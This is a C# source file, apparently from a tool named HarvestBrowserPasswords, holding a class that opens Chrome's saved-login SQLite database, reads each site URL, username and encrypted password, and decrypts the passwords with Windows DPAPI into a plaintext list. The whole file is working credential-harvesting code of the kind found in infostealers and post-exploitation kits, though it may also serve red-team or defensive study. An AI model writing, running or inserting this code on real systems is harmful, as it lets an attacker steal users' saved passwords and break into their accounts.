using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data.SQLite;
using System.Security.Cryptography;

namespace HarvestBrowserPasswords
{
    public class ChromeDatabaseDecryptor
    {
        private string FilePath { get; set; }
        public List<BrowserLoginData> ChromeLoginDataList { get; set; }

        public ChromeDatabaseDecryptor(string databaseFilePath)
        {
            FilePath = databaseFilePath;
            SQLiteConnection sqliteConnection = new SQLiteConnection(
                $"Data Source={FilePath};" +
                $"Version=3;" +
                $"New=True");

            ChromeLoginDataList = new List<BrowserLoginData>();

            try
            {
                sqliteConnection.Open();
                SQLiteCommand sqliteCommand = sqliteConnection.CreateCommand();
                sqliteCommand.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();

                //Iterate over each returned row from the query
                while (sqliteDataReader.Read())
                {
                    //Store columns as variables
                    string formSubmitUrl = sqliteDataReader.GetString(0);

                    //Avoid Printing empty rows
                    if (String.IsNullOrEmpty(formSubmitUrl))
                    {
                        continue;
                    }

                    string username = sqliteDataReader.GetString(1);
                    byte[] password = (byte[])sqliteDataReader[2]; //Cast to byteArray for DPAPI decryption

                    try
                    {
                        //DPAPI Decrypt - Requires System.Security.dll and using System.Security.Cryptography
                        byte[] decryptedBytes = ProtectedData.Unprotect(password, null, DataProtectionScope.CurrentUser);
                        string decryptedPasswordString = Encoding.ASCII.GetString(decryptedBytes);

                        BrowserLoginData loginData = new BrowserLoginData(formSubmitUrl, username, decryptedPasswordString, "Chrome");
                        ChromeLoginDataList.Add(loginData);
                    }
                    catch (Exception e)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[!] Error Decrypting Password: Exception {e}");
                        Console.ResetColor();
                    }
                }
    
            }
            catch (Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[!] Error connecting to database: {FilePath}\nException: {e}");
                Console.ResetColor();
            }

            sqliteConnection.Close();
        }
    }
}
